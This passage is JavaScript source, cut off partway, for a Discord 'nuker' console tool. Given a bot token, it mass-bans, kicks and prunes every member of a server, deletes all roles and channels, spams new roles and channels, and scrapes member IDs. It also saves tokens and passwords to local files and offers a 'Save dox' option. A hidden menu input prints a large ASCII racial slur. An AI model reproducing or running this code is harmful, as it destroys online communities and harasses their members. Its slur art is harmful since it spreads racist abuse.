const massLogins = new Map();
const request = require("request");
const readline = require("readline");
const ccx = require("chalk");

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

const ccsMB = `${"S"}${"l"}${"a"}${"y"}${"e"}${"r"}`;
const ccLx = `${"L"}${"x"}${"t"}${"e"}`;

console.clear();
let loggedIn = false;
if (require("./data/data.json")[2]) {
  if (require("./data/data.json")[2].func === true) {
    loggedIn = true;
  }
} else {
}

let accountUsername;

async function start() {
  console.clear();

  const { Client, WebhookClient, RichEmbed } = require("discord.js");
  let {
    red,
    green,
    blueBright,
    greenBright,
    blue,
    white,
    cyan,
    grey,
    yellow,
    black,
    blackBright,
  } = require("chalk");

  var mainColor = ccx.bold.rgb(200, 0, 200);

  if (require("./data/data.json")[5]) {
    if (require("./data/data.json")[5].color === 1) {
      mainColor = ccx.bold.rgb(200, 0, 100);
    }
    if (require("./data/data.json")[5].color === 2) {
      mainColor = ccx.bold.rgb(60, 180, 70);
      //mainColor = green
    }
    if (require("./data/data.json")[5].color === 3) {
      mainColor = ccx.bold.rgb(220, 0, 220); // 220 0 220
      //   mainColor = magentaBright
    }
    if (require("./data/data.json")[5].color === 4) {
      mainColor = cyan;
    }
    if (require("./data/data.json")[5].color === 5) {
      mainColor = yellow;
    }
    if (require("./data/data.json")[5].color === 6) {
      mainColor = grey;
    }
  }
  let cc = require("./data/data.json");

  if (!cc[1]) {
    cc[1] = {
      amount: 0,
    };
  }

  let count = require("./data/data.json")[1].amount;

  const fs = require("fs");

  count++;

  cc[1] = {
    amount: count,
  };

  fs.writeFile("./data/data.json", JSON.stringify(cc), (err) => {
    if (err) console.log();
  });

  const fetch = require("node-fetch");

  request("https://pastebin.com/raw/m7e2t7xe", (err, res, body) => {
    body = body.toString().split("\r\n");
    if (res.body.includes("yes")) {
      main();
      function main() {
        process.title = `[${ccLx} tools] - Main Menu`;
        console.clear();
        console.log(`      `);
        console.log(`      `);
        setTimeout(() => {
          console.log(
            white(
              "                                       ╦  ═╗ ╦╔╦╗╔═╗  ╔╦╗╔═╗╔═╗╦ "
            )
          );
        }, 40);
        setTimeout(() => {
          console.log(
            blackBright(
              "                                       ║  ╔╩╦╝ ║ ║╣    ║ ║ ║║ ║║ "
            )
          );
        }, 80);
        setTimeout(() => {
          console.log(
            mainColor(
              "                                       ╩═╝╩ ╚═ ╩ ╚═╝   ╩ ╚═╝╚═╝╩═╝"
            )
          );
        }, 120 /*200*/);
        setTimeout(() => {
          let ff = require("./data/data.json")[10];
          loggedIn === true ? yetes() : console.log(` `);
          function yetes() {
            console.log(` `);
            console.log(
              mainColor("                                        ") +
                white("Welcome back ") +
                mainColor(accountUsername || ff || "No username found, Od?")
            );
            console.log(` `);
          }
          console.log(
            mainColor(
              "                            ╔════════════════════════╦═════════════════════════╗"
            )
          );
        }, 150);
        setTimeout(() => {
          console.log(
            mainColor("                            ║ [") +
              white("1") +
              mainColor("]") +
              white(" Discord tool") +
              mainColor("       ║ [") +
              white("4") +
              mainColor("] ") +
              white("Main nuker ") +
              mainColor("         ║")
          );
        }, 180);
        setTimeout(() => {
          console.log(
            mainColor("                            ║ [") +
              white("2") +
              mainColor("]") +
              white(" Multi Nuker ") +
              mainColor("       ║ [") +
              white("5") +
              mainColor("] ") +
              white("Settings") +
              mainColor("            ║")
          );
        }, 210);

        setTimeout(() => {
          console.log(
            mainColor("                            ║ [") +
              white("3") +
              mainColor("] ") +
              white("Credits") +
              mainColor("            ║ [") +
              white("6") +
              mainColor("] ") +
              white("Exit ") +
              mainColor("               ║   ")
          );

          console.log(
            mainColor(
              "                            ╚════════════════════════╩═════════════════════════╝"
            )
          );
        }, 240);
        setTimeout(() => {
          console.log(` `);
          console.log(`      `);
          //                    console.log(`      `)

          rl.question(
            white("                             Choice:") +
              mainColor("\n                             > "),
            (ocde) => {
              let od = ocde.trim();
              const mainoptions = [
                "1",
                "nigga",
                "nigger",
                "2",
                "3",
                "4",
                "5",
                "6",
              ];

              if (!mainoptions.includes(od)) {
                console.log(` `);
                console.log(
                  `                             ${mainColor("[")}${white(
                    "!"
                  )}${mainColor("]")}${white(" Invalid choice")}`
                );
                setTimeout(() => {
                  start();
                }, 600);
                return;
              }

              if (od === "nigger" || od === "nigga") {
                console.log(
                  mainColor(`
                        
                        NIGGER               NIGGERNIGGERNIGGER
                        NIGGER               NIGGERNIGGERNIGGER
                        NIGGER               NIGGERNIGGERNIGGER
                        NIGGER               NIGGER
                        NIGGER               NIGGER
                        NIGGER               NIGGER
                        NIGGERNIGGERNIGGERNIGGERNIGGER
                        NIGGERNIGGERNIGGERNIGGERNIGGER
                        NIGGERNIGGERNIGGERNIGGERNIGGER
                           NIGGER               NIGGER
                           NIGGER               NIGGER
                           NIGGER               NIGGER
               NIGGERNIGGERNIGGER               NIGGER
               NIGGERNIGGERNIGGER               NIGGER
               NIGGERNIGGERNIGGER               NIGGER

                        `)
                );
              }
              if (od === "1") {
                if (loggedIn === false) {
                  console.log(
                    `                             ${mainColor("[")}${white(
                      "!"
                    )}${mainColor("]")}${white(" No account was logged in")}`
                  );
                  setTimeout(() => {
                    console.clear();
                    start();
                  }, 1000);
                  return;
                }
                console.clear();
                ran();
              } else {
                if (od === "3") {
                  mainCredits();
                  function mainCredits() {
                    function mainCredLogo() {
                      console.log(
                        mainColor(String.raw`
                                    
                                    
                     ________  ________  _______   ________  ___  _________  ________      
                     |\   ____\|\   __  \|\  ___ \ |\   ___ \|\  \|\___   ___\\   ____\     
                     \ \  \___|\ \  \|\  \ \   __/|\ \  \_|\ \ \  \|___ \  \_\ \  \___|_    
                      \ \  \    \ \   _  _\ \  \_|/_\ \  \ \\ \ \  \   \ \  \ \ \_____  \   
                       \ \  \____\ \  \\  \\ \  \_|\ \ \  \_\\ \ \  \   \ \  \ \|____|\  \  
                        \ \_______\ \__\\ _\\ \_______\ \_______\ \__\   \ \__\  ____\_\  \ 
                         \|_______|\|__|\|__|\|_______|\|_______|\|__|    \|__| |\_________\
                                                                                \|_________|
                                                                        
                                                                        
 

                                    `)
                      );

                      //   console.log(` `)
                      //        console.log(` `)
                      //       console.log(white('                             ╔═╗╦═╗╔═╗╔╦╗╦╔╦╗╔═╗'))
                      ///      console.log(blackBright('                             ║  ╠╦╝║╣  ║║║ ║ ╚═╗'))
                      //     console.log(mainColor('                             ╚═╝╩╚═╚═╝═╩╝╩ ╩ ╚═╝'))
                      //     console.log(` `)
                      //    console.log(` `)
                    }
                    console.clear();
                    mainCredLogo();
                    setTimeout(() => {
                      console.log(
                        `                             ${mainColor("[")}${white(
                          "?"
                        )}${mainColor("]")}${white(` ${ccLx} tool`)}`
                      );
                      console.log(` `);
                      setTimeout(() => {
                        console.clear();
                        mainCredLogo();
                        console.log(
                          mainColor("                             > ") +
                            white("Made By ") +
                            mainColor(`${ccsMB}`)
                        );
                        setTimeout(() => {
                          console.clear();
                          mainCredLogo();
                          console.log(
                            mainColor("                             > ") +
                              white("Made in ") +
                              mainColor("JavaScript")
                          );
                          setTimeout(() => {
                            console.clear();
                            mainCredLogo();
                            console.log(
                              mainColor("                             > ") +
                                white("Github: ") +
                                mainColor(`https://github.com/${ccsMB}M7`)
                            );
                            setTimeout(() => {
                              console.clear();
                              mainCredLogo();
                              console.log(
                                mainColor("                             > ") +
                                  white("Inspired by ") +
                                  mainColor("Serpah nuker")
                              );
                              setTimeout(() => {
                                console.clear();
                                mainCredLogo();
                                rl.question(
                                  mainColor("                             > ") +
                                    white("Type anything to continue") +
                                    mainColor(": "),
                                  () => {
                                    console.clear();
                                    start();
                                  }
                                );
                              }, 2000);
                            }, 2000);
                          }, 2000);
                        }, 2000);
                      }, 2000);
                    }, 2000);
                  }
                }
                if (od === "2") {
                  if (loggedIn === false) {
                    console.log(
                      red("                             > ") +
                        white("No account is logged in")
                    );
                    setTimeout(() => {
                      console.clear();
                      start();
                    }, 600);
                    return;
                  }
                  process.title = `[${ccLx} tools] - Multi nuker `;
                  function mm() {
                    console.clear();
                    function multiNukerLogo() {
                      setTimeout(() => {
                        console.log(`      `);
                        console.log(`      `);
                      }, 40);
                      setTimeout(() => {
                        console.log(
                          mainColor(
                            "                                               ╦  ═╗ ╦╔╦╗╔═╗"
                          )
                        );
                      }, 80);
                      setTimeout(() => {
                        console.log(
                          blackBright(
                            "                                               ║  ╔╩╦╝ ║ ║╣ "
                          )
                        );
                      }, 120);
                      setTimeout(() => {
                        console.log(
                          white(
                            "                                               ╩═╝╩ ╚═ ╩ ╚═╝"
                          )
                        );
                        console.log(" ");
                      }, 160);
                      setTimeout(() => {
                        console.log(
                          mainColor(
                            "                       ╔═══════════════════╦═════════════════════╦═════════════════════╦"
                          )
                        );
                      }, 200);
                      setTimeout(() => {
                        console.log(
                          mainColor("                       ║ [") +
                            white("1") +
                            mainColor("] ") +
                            white("Ban members  ") +
                            mainColor(" ║ [") +
                            white("4") +
                            mainColor("] ") +
                            white("Create roles") +
                            mainColor("    ║ [") +
                            white("7") +
                            mainColor("]") +
                            white(" Delete channels") +
                            mainColor(" ║")
                        );
                        console.log(
                          mainColor("                       ║ [") +
                            white("2") +
                            mainColor("] ") +
                            white("Kick members ") +
                            mainColor(" ║ [") +
                            white("5") +
                            mainColor("] ") +
                            white("Main Menu      ") +
                            mainColor(" ║ [") +
                            white("8") +
                            mainColor("]") +
                            white(" Create channels") +
                            mainColor(" ║")
                        );
                        console.log(
                          mainColor("                       ║ [") +
                            white("3") +
                            mainColor("] ") +
                            white("Prune members ") +
                            mainColor("║ [") +
                            white("6") +
                            mainColor("] ") +
                            white("Delete roles") +
                            mainColor("    ║ [") +
                            white("9") +
                            mainColor("]") +
                            white(" Scrape Info    ") +
                            mainColor(" ║")
                        );
                      }, 240);
                      setTimeout(() => {
                        console.log(
                          mainColor(
                            "                       ╚═══════════════════╩═════════════════════╩═════════════════════╩"
                          )
                        );
                        console.log(` `);
                      }, 280);
                    }
                    ytu();

                    multiNukerLogo();
                    function ytu() {
                      setTimeout(() => {
                        if (require("./data/tokens.json")[1]) {
                          rl.question(
                            mainColor("                        > ") +
                              white("Would you like to use saved token") +
                              mainColor(": "),
                            (saveT) => {
                              const saveToken = saveT.trim();
                              const saveTOptions = [
                                "no",
                                "new",
                                "old",
                                "saved",
                                "yes",
                              ];
                              if (!saveTOptions.includes(saveToken)) {
                                console.log(
                                  `                        ${red(">")}${white(
                                    " Invalid option"
                                  )}`
                                );
                                setTimeout(() => {
                                  console.clear();
                                  start();
                                }, 1200);
                                return;
                              }
                              if (saveToken === "no" || saveToken === "new") {
                                console.log(` `);
                                rl.question(
                                  mainColor("                        > ") +
                                    white("Enter token to save") +
                                    mainColor(": "),
                                  (TokeToSavee) => {
                                    const tokeToSave = TokeToSavee.trim();
                                    const cc = new Client();
                                    var isSelfBot;
                                    cc.on("ready", () => {
                                      if (!cc.user.bot) {
                                        console.log(
                                          `                        ${red(
                                            ">"
                                          )}${white(" No self bots allowed")}`
                                        );
                                        setTimeout(() => {
                                          start();
                                        }, 2000);
                                        return;
                                      }
                                      cc.destroy();
                                    });

                                    cc.login(tokeToSave);
                                    const tokeSave = require("./data/tokens.json");

                                    tokeSave[1] = {
                                      token: tokeToSave,
                                    };
                                    fs.writeFile(
                                      "./data/tokens.json",
                                      JSON.stringify(tokeSave),
                                      (err) => {
                                        if (err) {
                                        }
                                      }
                                    );
                                    console.clear();
                                    multiNukerLogo();

                                    setTimeout(() => {
                                      console.log(
                                        `                        ${green(
                                          ">"
                                        )}${white(" Token saved")}`
                                      );
                                      console.log(` `);
                                      rl.question(
                                        mainColor(
                                          "                        > "
                                        ) + white("Type anything to continue"),
                                        () => {
                                          start();
                                        }
                                      );
                                    }, 500);
                                  }
                                );
                                return;
                              }

                              if (saveToken === "yes" || saveToken === "old") {
                                let token = require("./data/tokens.json")[1]
                                  .token;
                                if (token === "9") {
                                  console.clear();
                                  start();
                                  return;
                                }
                                console.clear();
                                mk();

                                async function mk() {
                                  multiNukerLogo();
                                  if (
                                    token.startsWith('"') &&
                                    token.endsWith('"')
                                  ) {
                                    token = token.slice(1, token.length - 1);
                                  }

                                  const ops = [
                                    "1",
                                    "2",
                                    "3",
                                    "4",
                                    "5",
                                    "6",
                                    "7",
                                    "8",
                                    "9",
                                    //     '10'
                                  ];

                                  const client = new Client();
                                  client.on("ready", async () => {
                                    client.on("rateLimit", () => {
                                      console.log(
                                        `                        ${mainColor(
                                          "["
                                        )}${white("!")}${mainColor("]")}${white(
                                          " Rate limited sleeping for "
                                        )} ${mainColor(0)}${white(" seconds")}`
                                      );
                                    });
                                    process.title = `[${ccLx} tools] - Connected ${client.user.tag}`;

                                    if (!client.user.bot) {
                                      console.log(
                                        red("                        > ") +
                                          white("No self bots allowed")
                                      );

                                      setTimeout(() => {
                                        ytu();
                                      }, 1 * 1000);
                                      return;
                                    }

                                    rl.question(
                                      mainColor(
                                        "                             > "
                                      ) +
                                        white("Enter option") +
                                        mainColor(": "),
                                      async (optionGonna) => {
                                        let option = optionGonna.trim();

                                        if (!ops.includes(option)) {
                                          console.clear();
                                          mk();
                                          return;
                                        }
                                        try {
                                          if (option === "1") {
                                            rl.question(
                                              mainColor(
                                                "                             > "
                                              ) +
                                                white("Guild ID") +
                                                mainColor(": "),
                                              async (guildID) => {
                                                const server = client.guilds.get(
                                                  guildID
                                                );

                                                for (
                                                  let i = 0;
                                                  i <
                                                  server.members.array().length;
                                                  i++
                                                ) {
                                                  let u = server.members.array()[
                                                    i
                                                  ];

                                                  u.ban()
                                                    .then(() => {
                                                      console.log(
                                                        mainColor(
                                                          "                              ["
                                                        ) +
                                                          white("+") +
                                                          mainColor("] ") +
                                                          white("Banned ") +
                                                          mainColor(u.user.tag)
                                                      );
                                                    })
                                                    .catch(() => {
                                                      console.log(
                                                        mainColor(
                                                          "                              ["
                                                        ) +
                                                          white("-") +
                                                          mainColor("] ") +
                                                          white(
                                                            "Couldn't Ban "
                                                          ) +
                                                          mainColor(u.user.tag)
                                                      );
                                                    });
                                                }

                                                server.members.forEach((mm) => {
                                                  mm.ban()
                                                    .then(() => {
                                                      console.log(
                                                        mainColor(
                                                          "                              ["
                                                        ) +
                                                          white("+") +
                                                          mainColor("] ") +
                                                          white("Banned ") +
                                                          mainColor(mm.user.tag)
                                                      );
                                                    })
                                                    .catch(() => {});
                                                });

                                                /**
                                                                                 *      const server = client.guilds.get(guildID)
    
                                                                                    for (const memberI of server.members) {
                                                                                        let member = memberI[1]
    
                                                                                        member.ban().then(() => {
                                                                                            console.log(mainColor('                              [') + white('+') + mainColor('] ') + white('Banned ') + mainColor(member.user.tag));
                                                                                        }).catch(() => {
                                                                                            console.log(mainColor('                              [') + white('-') + mainColor('] ') + white('Couldn\'t Ban ') + mainColor(member.user.tag));
                                                                                        })
                                                                                    }
                                                                                 */
                                              }
                                            );
                                          }

                                          if (option === "2") {
                                            rl.question(
                                              mainColor(
                                                "                             > "
                                              ) +
                                                white("Guild ID") +
                                                mainColor(": "),
                                              (guildID) => {
                                                const server = client.guilds.get(
                                                  guildID
                                                );

                                                server.members.forEach(
                                                  (member) => {
                                                    member
                                                      .kick()
                                                      .then(() => {
                                                        console.log(
                                                          mainColor(
                                                            "                              ["
                                                          ) +
                                                            white("+") +
                                                            mainColor("] ") +
                                                            white("Kicked ") +
                                                            mainColor(
                                                              member.user.tag
                                                            )
                                                        );
                                                      })
                                                      .catch(() => {
                                                        console.log(
                                                          mainColor(
                                                            "                              ["
                                                          ) +
                                                            white("-") +
                                                            mainColor("] ") +
                                                            white(
                                                              "Couldn't Kick "
                                                            ) +
                                                            mainColor(
                                                              member.user.tag
                                                            )
                                                        );
                                                      });
                                                  }
                                                );
                                              }
                                            );
                                          }
                                          if (option === "3") {
                                            rl.question(
                                              mainColor(
                                                "                             > "
                                              ) +
                                                white("Enter Guild ID") +
                                                mainColor(": "),
                                              (guildId) => {
                                                try {
                                                  client.guilds.get(guildId);
                                                } catch (error) {
                                                  console.log(
                                                    red(
                                                      "                               Invalid guild ID"
                                                    )
                                                  );
                                                  setTimeout(() => {
                                                    console.clear();
                                                    mk();
                                                  }, 2 * 1000);
                                                  return;
                                                }
                                                let server = client.guilds.get(
                                                  guildId
                                                );

                                                server
                                                  .pruneMembers(1)
                                                  .then(() => {
                                                    console.log("   ");
                                                    console.log(
                                                      mainColor(
                                                        "                             ["
                                                      ) +
                                                        white("+") +
                                                        mainColor("]") +
                                                        white("Pruned ") +
                                                        mainColor(server.id)
                                                    );
                                                    console.log(` `);
                                                    setTimeout(() => {
                                                      rl.question(
                                                        mainColor(
                                                          "                             > "
                                                        ) +
                                                          white(
                                                            "Enter anything to continue: "
                                                          ),
                                                        () => {
                                                          console.clear();
                                                          mk();
                                                        }
                                                      );
                                                    }, 2 * 1000);
                                                  });
                                              }
                                            );
                                          }
                                          if (option === "4") {
                                            rl.question(
                                              mainColor(
                                                "                             > "
                                              ) +
                                                white("Guild ID") +
                                                mainColor(": "),
                                              (guildID) => {
                                                try {
                                                  client.guilds.get(guildID);
                                                } catch (e) {
                                                  console.log(
                                                    red(
                                                      "                               Invalid guild ID"
                                                    )
                                                  );
                                                }

                                                let server = client.guilds.get(
                                                  guildID
                                                );

                                                rl.question(
                                                  mainColor(
                                                    "                             > "
                                                  ) +
                                                    white("Enter role name: "),
                                                  (roleNames) => {
                                                    rl.question(
                                                      mainColor(
                                                        "                             > "
                                                      ) +
                                                        white(
                                                          "Enter role amount: "
                                                        ),
                                                      (rlAmount) => {
                                                        let count = 0;

                                                        // setInterval(() => {
                                                        while (
                                                          count < rlAmount
                                                        ) {
                                                          count++;
                                                          server
                                                            .createRole({
                                                              name: roleNames,
                                                              color: "RANDOM",
                                                            })
                                                            .then((role) => {
                                                              count++;
                                                              console.log(
                                                                mainColor(
                                                                  "                             ["
                                                                ) +
                                                                  white("+") +
                                                                  mainColor(
                                                                    "]"
                                                                  ) +
                                                                  white(
                                                                    "Created role "
                                                                  ) +
                                                                  mainColor(
                                                                    role.name
                                                                  )
                                                              );
                                                            })
                                                            .catch(() => {});
                                                        }
                                                      }
                                                    );
                                                  }
                                                );
                                              }
                                            );
                                          }
                                          if (option === "6") {
                                            rl.question(
                                              mainColor(
                                                "                             > "
                                              ) +
                                                white("Guild ID") +
                                                mainColor(": "),
                                              (guildID) => {
                                                //     rl.question(mainColor('                             > ') + white('Amount to delete') + mainColor(': '), (amountString) => {
                                                try {
                                                  client.guilds.get(guildID);
                                                } catch (e) {
                                                  console.log(
                                                    red(
                                                      "                               Invalid guild ID"
                                                    )
                                                  );
                                                }
                                                ///  console.log(mainColor('                             [') + white('+') + mainColor(']') + white("Deleted role ") + mainColor(role.name));
                                                let server = client.guilds.get(
                                                  guildID
                                                );

                                                server.roles.forEach((role) => {
                                                  role
                                                    .delete()
                                                    .then(() => {
                                                      console.log(
                                                        mainColor(
                                                          "                             ["
                                                        ) +
                                                          white("+") +
                                                          mainColor("]") +
                                                          white(
                                                            "Deleted role "
                                                          ) +
                                                          mainColor(role.name)
                                                      );
                                                    })
                                                    .catch(() => {
                                                      console.log(
                                                        mainColor(
                                                          "                             ["
                                                        ) +
                                                          white("-") +
                                                          mainColor("]") +
                                                          white(
                                                            "Couldn't Deleted role "
                                                          ) +
                                                          mainColor(role.name)
                                                      );
                                                    });
                                                });
                                              }
                                            );
                                          }
                                          if (option === "7") {
                                            rl.question(
                                              mainColor(
                                                "                             > "
                                              ) +
                                                white("Guild ID") +
                                                mainColor(": "),
                                              (guildID) => {
                                                try {
                                                  client.guilds.get(guildID);
                                                } catch (e) {
                                                  console.log(
                                                    red(
                                                      "                               Invalid guild ID"
                                                    )
                                                  );
                                                }

                                                var server = client.guilds.get(
                                                  guildID
                                                );

                                                server.channels.forEach(
                                                  (ch) => {
                                                    ch.delete()
                                                      .then((channel) => {
                                                        console.log(
                                                          mainColor(
                                                            "                             ["
                                                          ) +
                                                            white("+") +
                                                            mainColor("]") +
                                                            white(
                                                              "Deleted channel "
                                                            ) +
                                                            mainColor(
                                                              channel.name
                                                            )
                                                        );
                                                      })
                                                      .catch(() => {});
                                                    let allChannelsDeled = false;
                                                    let timeToWait = 3;
                                                    setInterval(() => {
                                                      if (
                                                        server.channels.size
                                                          .length > 100
                                                      ) {
                                                      } else {
                                                        if (
                                                          server.channels.size
                                                            .length > 250
                                                        ) {
                                                          timeToWait = 7;
                                                        } else {
                                                          timeToWait = 3;
                                                        }
                                                      }

                                                      if (
                                                        server.channels.size
                                                          .length < 100
                                                      ) {
                                                        timeToWait = 3;
                                                      }
                                                      if (
                                                        server.channels.size
                                                          .length === 0
                                                      ) {
                                                        allChannelsDeled = true;
                                                      }
                                                    });
                                                    setTimeout(() => {
                                                      if (
                                                        (allChannelsDeled = true)
                                                      ) {
                                                        rl.question(
                                                          mainColor(
                                                            "                             > "
                                                          ) +
                                                            white(
                                                              "Type anything to continue: "
                                                            ),
                                                          () => {
                                                            setTimeout(() => {
                                                              console.clear();
                                                              mk();
                                                            }, 1000);
                                                          }
                                                        );
                                                      }
                                                    }, timeToWait * 1000);
                                                  }
                                                );
                                              }
                                            );
                                          }
                                          if (option === "8") {
                                            let co = 0;
                                            let stopo = false;
                                            rl.question(
                                              mainColor(
                                                "                             > "
                                              ) +
                                                white("Guild ID") +
                                                mainColor(": "),
                                              (guildID) => {
                                                try {
                                                  client.guilds.get(guildID);
                                                } catch (e) {
                                                  console.log(
                                                    red(
                                                      "                               Invalid guild ID"
                                                    )
                                                  );
                                                }
                                                const server = client.guilds.get(
                                                  guildID
                                                );
                                                rl.question(
                                                  mainColor(
                                                    "                             > "
                                                  ) +
                                                    white("Channel names") +
                                                    mainColor(": "),
                                                  (chName) => {
                                                    rl.question(
                                                      mainColor(
                                                        "                             > "
                                                      ) +
                                                        white("Enter amount") +
                                                        mainColor(": "),
                                                      (chAmount) => {
                                                        let count = 0;
                                                        while (
                                                          count < chAmount
                                                        ) {
                                                          count++;
                                                          server
                                                            .createChannel(
                                                              chName,
                                                              {
                                                                type: "text",
                                                                reason: `Made By ${ccsMB}`,
                                                              }
                                                            )
                                                            .then((ch) => {
                                                              if (
                                                                co >= chAmount
                                                              ) {
                                                                rl.question(
                                                                  mainColor(
                                                                    "                             > "
                                                                  ) +
                                                                    white(
                                                                      "Type anything to continue"
                                                                    ) +
                                                                    mainColor(
                                                                      ": "
                                                                    ),
                                                                  () => {
                                                                    mk();
                                                                  }
                                                                );
                                                                return;
                                                              }
                                                              co++;
                                                              console.log(
                                                                mainColor(
                                                                  "                             ["
                                                                ) +
                                                                  white("+") +
                                                                  mainColor(
                                                                    "]"
                                                                  ) +
                                                                  white(
                                                                    "Created channel "
                                                                  ) +
                                                                  mainColor(
                                                                    ch.name
                                                                  )
                                                              );
                                                            });
                                                        }
                                                      }
                                                    );
                                                  }
                                                );
                                              }
                                            );
                                          }

                                          if (option === "9") {
                                            process.title = `[${ccLx} tools] - Connecting..`;
                                            setTimeout(() => {
                                              let prefix = ">";
                                              rl.question(
                                                mainColor(
                                                  "                             > "
                                                ) +
                                                  white("Enter your ID") +
                                                  mainColor(": "),
                                                (id) => {
                                                  console.log(
                                                    mainColor(
                                                      "                             ["
                                                    ) +
                                                      white("?") +
                                                      mainColor("]") +
                                                      white(" type ") +
                                                      mainColor(">scrape ") +
                                                      white(
                                                        " in any server to scrape"
                                                      )
                                                  );
                                                  console.log(` `);
                                                  client.once(
                                                    "message",
                                                    async (message) => {
                                                      if (
                                                        message.author.id !== id
                                                      )
                                                        return;

                                                      const args = message.content
                                                        .slice(prefix.length)
                                                        .trim()
                                                        .split(/ +/g);
                                                      const command = args
                                                        .shift()
                                                        .toLocaleLowerCase();

                                                      if (
                                                        command === "scrape"
                                                      ) {
                                                        message.delete();
                                                        console.log(` `);
                                                        console.log(
                                                          mainColor(
                                                            "                             ["
                                                          ) +
                                                            white("?") +
                                                            mainColor("] ") +
                                                            white("Scraped ") +
                                                            mainColor(
                                                              message.guild
                                                                .memberCount
                                                            ) +
                                                            white(" members")
                                                        );
                                                        let member = await message.guild.fetchMembers();
                                                        var mmTag = require("./scraper/members.json");
                                                        mmTag[member.id] = {
                                                          tag: member.id,
                                                        };
                                                        fs.writeFile(
                                                          "./scraper/members.json",
                                                          JSON.stringify(mmTag),
                                                          () => {}
                                                        );

                                                        setTimeout(() => {
                                                          console.clear();
                                                          mk();
                                                        }, 2000);
                                                      }
                                                    }
                                                  );
                                                }
                                              );
                                            }, 2000);
                                          }

                                          if (option === "5") {
                                            console.clear();
                                            start();
                                          }
                                        } catch (e) {}
                                      }
                                    );
                                  });

                                  client.login(token.trim()).catch(() => {
                                    console.log(
                                      red("                        > ") +
                                        white("Incorrect token passed")
                                    );
                                    ytu();
                                  });
                                }
                              }
                            }
                          );
                        } else {
                          console.log(
                            `                        ${mainColor("[")}${white(
                              "?"
                            )}${mainColor("]")}${white(
                              " No saved token found"
                            )}`
                          );
                          console.log(` `);
                          setTimeout(() => {
                            rl.question(
                              mainColor("                        > ") +
                                white("Enter token to save") +
                                mainColor(": "),
                              (tokeToSave) => {
                                const cc = new Client();
                                var isSelfBot;
                                cc.on("ready", () => {
                                  if (!cc.user.bot) {
                                    isSelfBot = true;
                                  }
                                  cc.destroy();
                                });

                                cc.login(tokeToSave).catch(() => {
                                  console.log(
                                    red("                        > ") +
                                      white("Invalid token")
                                  );
                                  setTimeout(() => {
                                    start();
                                  }, 1000);
                                  return;
                                });
                                if (isSelfBot === true) {
                                  console.log(
                                    `                        ${mainColor(
                                      "["
                                    )}${white("!")}${mainColor("]")}${white(
                                      " No self bots allowed"
                                    )}`
                                  );
                                  setTimeout(() => {
                                    start();
                                  }, 2000);
                                  return;
                                }
                                const tokeSave = require("./data/tokens.json");

                                tokeSave[1] = {
                                  token: tokeToSave,
                                };
                                fs.writeFile(
                                  "./data/tokens.json",
                                  JSON.stringify(tokeSave),
                                  (err) => {
                                    if (err) {
                                    }
                                  }
                                );
                                console.clear();
                                multiNukerLogo();

                                setTimeout(() => {
                                  console.log(
                                    `                        ${green(
                                      ">"
                                    )}${white(" Token saved")}`
                                  );
                                  console.log(` `);
                                  rl.question(
                                    mainColor("                        > ") +
                                      white("Type anything to continue"),
                                    () => {
                                      start();
                                    }
                                  );
                                }, 500);
                              }
                            );
                            return;
                          }, 2000);
                        }
                      }, 320);
                    }
                  }

                  mm();
                }
                if (od === "6") {
                  process.exit();
                }
                if (od === "5") {
                  mainSettings();
                  function mainSettings() {
                    console.clear();
                    setTimeout(() => {
                      console.log(
                        mainColor(
                          "                                       ╔═╗╔═╗╔╦╗╔╦╗╦╔╗╔╔═╗╔═╗ "
                        )
                      );
                    }, 40);
                    setTimeout(() => {
                      console.log(
                        blackBright(
                          "                                       ╚═╗║╣  ║  ║ ║║║║║ ╦╚═╗ "
                        )
                      );
                    }, 80);
                    setTimeout(() => {
                      console.log(
                        white(
                          "                                       ╚═╝╚═╝ ╩  ╩ ╩╝╚╝╚═╝╚═╝"
                        )
                      );
                    }, 120 /*200*/);
                    setTimeout(() => {
                      console.log(`                   `);
                      console.log(
                        mainColor(
                          "                            ╔════════════════════════╦═════════════════════════╗"
                        )
                      );
                    }, 150);
                    setTimeout(() => {
                      console.log(
                        mainColor("                            ║ [") +
                          white("1") +
                          mainColor("]") +
                          white(" Set login   ") +
                          mainColor("       ║ [") +
                          white("4") +
                          mainColor("] ") +
                          white("Save dox      ") +
                          mainColor("      ║")
                      );
                    }, 180);
                    setTimeout(() => {
                      console.log(
                        mainColor("                            ║ [") +
                          white("2") +
                          mainColor("]") +
                          white(" Nuke settings  ") +
                          mainColor("    ║ [") +
                          white("5") +
                          mainColor("] ") +
                          white("Main menu  ") +
                          mainColor("         ║")
                      );
                      console.log(
                        mainColor("                            ║ [") +
                          white("3") +
                          mainColor("]") +
                          white(" Theme          ") +
                          mainColor("    ║ [") +
                          white("6") +
                          mainColor("] ") +
                          white("Add account  ") +
                          mainColor("       ║")
                      );
                    }, 210);

                    setTimeout(() => {
                      console.log(
                        mainColor(
                          "                            ╚════════════════════════╩═════════════════════════╝"
                        )
                      );
                      console.log(` `);
                    }, 240);
                    setTimeout(() => {
                      rl.question(
                        mainColor("                             > ") +
                          white("Choice") +
                          mainColor(": "),
                        (choice) => {
                          const choices = ["1", "2", "3", "4", "5", "6"];

                          if (!choices.includes(choice)) {
                            console.log(` `);
                            console.log(
                              `                             ${mainColor(
                                "["
                              )}${white("!")}${mainColor("]")}${white(
                                " Invalid choice"
                              )}`
                            );
                            setTimeout(() => {
                              console.log(` `);
                              mainSettings();
                            }, 2000);
                            return;
                          }
                          if (choice === "6") {
                            if (loggedIn === false) {
                              console.log(
                                red("                             > ") +
                                  white("No account is logged in")
                              );
                              setTimeout(() => {
                                console.clear();
                                start();
                              }, 600);
                              return;
                            }
                            rl.question(
                              mainColor("                             > ") +
                                white("Enter account username") +
                                mainColor(": "),
                              (usernameToSet) => {
                                const username = usernameToSet.trim();

                                rl.question(
                                  mainColor("                             > ") +
                                    white("Enter password") +
                                    mainColor(": "),
                                  (passwordToSet) => {
                                    const password = passwordToSet.trim();

                                    const file = require("./data/logins.json");

                                    let content = file;

                                    content[username] = {
                                      password: password,
                                    };

                                    fs.writeFile(
                                      "./data/logins.json",
                                      JSON.stringify(file, null, 2),
                                      (err) => {}
                                    );

                                    setTimeout(() => {
                                      start();
                                    }, 2000);
                                  }
                                );
                              }
                            );
                          }
                          if (choice === "3") {
                            pickTheme();
                            function pickTheme() {
                              rl.question(
                                mainColor("                             > ") +
                                  white("Enter theme colour: "),
                                (col) => {
                                  let color = col.trim();
                                  const colors = [
                                    "red",
                                    "green",
                                    "magenta",
                                    "cyan",
                                    "yellow",
                                    "grey",
                                  ];

                                  if (!colors.includes(color.toLowerCase())) {
